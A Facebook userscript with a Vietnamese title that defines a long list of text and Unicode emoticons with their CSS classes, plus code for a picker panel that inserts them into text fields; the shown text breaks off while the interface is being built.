// ==UserScript==
// @name            Cài Ðặt Icon Cực Hot Cho Trang Cá Nhân
// @description     CoppyRight Nhật Minh
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Extra Facebook Smileys");

	// = Data =======
	var emoticons = [ { // Text to picture emoticons
"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Smiley"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Frown"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Tongue"
	}, {
        "chars" : " :D ",
		"class" : "emoticon_grin",
		"name" : "Grin"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Gasp"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Wink"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Pacman"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "GruÃ±Ã³n"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Unsure"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Cry"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Kiki"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Glasses"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Sunglasses"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Heart"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Devil"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Angel"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Squint"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Confused"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Upset"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Colonthree"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Like"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Kiss"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Shark"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "PingÃ¼ino"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Poop"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Putman"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Pink Umbrella"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Sea Wave"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Crescent moon"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Bright Star"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Seedbed"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Single Palm Tree"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Cactus"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Tulip"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Cherry Blossom"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Rose"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cayenne"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Sunflower"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Ear Of Rice"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Four Leaf Clover"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Maple Leaf"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Fallen Leaf"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Leaf Floating In The Wind"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Tangerine"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Red Apple"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Strawberry"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Burger"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Cocktail Glass"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Tankard"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Gift Wrapped"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Pumpkin With Candle"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Christmas Tree"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Santa"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Balloon"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Party Popper"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Pine Decor"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Japanese Dolls"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Carp Streamer"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Wind Chime"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Graduation Cap"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Musical Note"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Multiple Musical Notes"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Musical Score"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Snake"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Horse"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Sheep"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Monkey"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Hen"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Wild Boar"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Elephant"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Octopus"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Snail Shell"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Insect"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Fish"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Tropical Fish"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Pufferfish"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Chick In Front"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Bird"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Penguin"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Koala"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Poodle"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Bactrian Camel"
	}, {
		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Dolphin"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Mouse Face"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Cow Face"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Cara de tigre"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Rabbit Face"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Cat Face"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Whale Sputtering"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Horse Face"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Monkey Face"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Pig face"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Frog Face"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Hamster Face"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Wolf Face"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Bear Face"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Footprints"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Eyes"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Ear"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Nose"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Mouth"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Sour Face"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "White hand pointing up"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "White hand faces downward"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "White hand indicating left"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "White hand indicating right"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Fist"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Hand in motion"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "Hand showing all good"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Hand with thumb up"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Hand with thumb down"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Hands clapping"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Open Hands"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "Boy"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "Girl"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "Man"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Woman"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Man and woman holding hands"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Police Officer"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Woman with bunny ears"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Person with hair rubio"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Man with pi mao gua"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Man with turban"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Old Man"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Old Woman"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Baby"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Construction Worker"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Princess"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Ghost"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Angel baby"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Alien"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Alien Monster"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Imp"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Skull"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Guard"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Ballerina"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Nail Polish"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Brand of kiss"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Kissing couple"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Bunch of flowers"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Couple with heart"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Heart beating"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Broken Heart"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Bright Heart"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Heart growing"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Heart with arrow"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Blue Heart"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Green Heart"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Yellow Heart"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Purple Heart"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Heart with ribbon"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Symbol of anger"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Sleeping"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Sweat Symbol"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Quick Start Symbol"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Pile of Caca"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Flexed bicep"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
		"name" : "Personal Computer"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "Mini Disco"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Floppy disk"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Optical Disc"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Telephone receiver"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Fax"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Mobile Phone"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Mobile phone with arrow from left to right"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Television"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Bell"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Face to face with smiling eyes"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Face with tears of joy"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Smiley face with open mouth"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Face and eyes smiling with mouth open"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Smiley face with mouth open and eyes closed"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Face winking eye"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Guy savoring delicious food"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Relief face"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Smiley face with heart shaped eyes"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Smirk face"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Face of boredom"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Face with cold sweat"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Pensive face"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Confused face"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Throwing kiss Face"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Kissing face with eyes closed"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Face with tongue out and winking"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Face with tongue hanging out and eyes closed"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Face discouraged"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Face of anger"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Very angry face"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Crying Face"
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Face of perseverance"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Face of triumph"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Face discouraged but relieved"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Scary face"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Fatigued face"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Sleeping face"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Tired face"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Face screaming"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Face with mouth open and cold sweat"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Terrified face of fear"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Very surprised face"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Face flushed"
	}, {
		"chars" : " \ud83d\ude35 ",
		"class" : "_1az _1a- _2go",
		"name" : "Face dizzy"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Face with medical mask"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Grinning Cat face and eyes closed"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Cat face with tears of laughter"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Smiling cat face with open mouth"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Smiling cat face with hearts in her eyes"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Face of cat smile twisted"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Cat face kissing with eyes closed"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Cat face crying"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Cat face scared terrified"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Happy person raising a hand"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Person holding up both hands in celebration"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Person frowning"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Person in prayer"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Index finger pointing up"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "White face smiling"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "High voltage symbol"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Snowless snowman"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Fist up"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Hand pointing up"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "Winning Hand"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Sun With Rays"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Cloud"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Umbrella With Rain Drops"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Hot Drink"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Brightness"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Heavy Black Heart"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	    html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
	// {

	// Toggler
